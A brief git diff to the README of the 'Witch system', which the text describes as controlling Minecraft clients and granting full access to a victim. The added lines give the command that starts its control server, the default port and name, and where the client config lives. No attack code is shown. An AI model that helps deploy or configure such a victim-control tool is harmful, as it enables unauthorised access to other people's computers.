@@ -79,7 +79,9 @@ The Witch system controls Minecraft clients and grant full access to your victim
 
 * [ ] Client: Build system working
 * [ ] Better config
-* Server config in Cfg.java
+* Server: `java -jar server.jar <port> <name>`
+* Default port and name: `11451` and `Witch`
+* Client config in Cfg.java
 
 #### Files:
 
